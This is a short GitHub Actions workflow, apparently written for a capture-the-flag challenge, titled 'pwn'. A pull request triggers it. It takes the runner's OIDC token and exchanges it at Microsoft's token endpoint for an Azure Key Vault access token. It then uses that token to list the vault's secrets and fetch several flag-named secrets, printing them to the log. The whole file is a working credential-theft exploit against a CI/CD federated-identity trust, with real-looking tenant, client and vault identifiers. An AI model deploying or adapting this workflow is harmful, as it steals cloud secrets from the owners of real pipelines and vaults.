name: pwn
  on: pull_request
  permissions:
    id-token: write
    contents: read
  jobs:
    x:
      runs-on: ubuntu-latest
      steps:
        - run: |
            J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
              | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
            echo "OIDC_LEN=${#J}"
            echo "$J" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import json,sys;d=json.load(sys.stdin);print('SUB:',d.get('sub'))" || true
            T=$(curl -sS -X POST \
              "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
              -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_
  assertion=$J&scope=https://vault.azure.net/.default" \
              | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('access_token','FAIL: '+str(d)[:500]))")
            echo "=== KV secrets ==="
            curl -sS -H "Authorization: Bearer $T" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4"
            for n in flag FLAG ctf-flag tebamoto-flag challenge-flag; do
              echo "=== secret: $n ==="
              curl -sS -H "Authorization: Bearer $T" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$n?api-version=7.4"
            done
